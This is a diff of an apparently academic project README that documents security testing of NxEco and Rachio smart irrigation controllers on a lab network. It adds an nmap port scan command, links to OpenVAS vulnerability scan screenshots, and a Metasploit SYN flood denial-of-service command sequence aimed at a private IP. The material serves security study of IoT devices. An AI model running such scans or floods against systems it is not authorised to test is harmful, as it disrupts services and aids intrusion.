@@ -37,30 +37,48 @@ Here are the implementations.
 
 **Port Scanning**
 - Metasploit Nmap
-use 'nmap' to scanning ports on both devices. They are in the
-'''
 
 '''
-- result
-![Nmap]()
+root@kali:~# nmap -v -sV -oA port_scanning 192.168.1.0/29
+'''
+
+- Results
+NxEco
+![nxeco_scan](https://github.com/ffrqw/ECE209AS/blob/master/images/nxeco_scan.png?raw=true)
+
+Rachio
+![rachio_scan](https://github.com/ffrqw/ECE209AS/blob/master/images/rachio_scan.png?raw=true)
 
 **Vulunrablity Analysis**
 - OpenVAS
 
-'''
+- Results
+NxEco
+![nxeco_edit](https://github.com/ffrqw/ECE209AS/blob/master/images/nxeco_edit.png?raw=true)
 
-'''
-- result
-![openvas]()
+![nxeco_results](https://github.com/ffrqw/ECE209AS/blob/master/images/nxeco.png?raw=true)
+
+Rachio
+![rachio_edit](https://github.com/ffrqw/ECE209AS/blob/master/images/rachio_edit.png?raw=true)
+
+![rachio_results](https://github.com/ffrqw/ECE209AS/blob/master/images/rachio.png?raw=true)
+
 
 **DoS Attack**
-- Metasploit auxiliary module
+- Metasploit auxiliary module attack
 
 '''
-
+msf > use auxiliary/dos/tcp/synflood 
+msf auxiliary(dos/tcp/synflood) > set RHOST 192.168.1.9
+RHOST => 192.168.1.9
+msf auxiliary(dos/tcp/synflood) > run
 '''
--result
-![DoS]()
+-Results
+NxEco
+![nxeco_flood](https://github.com/ffrqw/ECE209AS/blob/master/images/nxeco_flood.png?raw=true)
+
+Rachio
+![rachio_flood](https://github.com/ffrqw/ECE209AS/blob/master/images/rachio_flood.png?raw=true)
 
 
 ### Mobile application
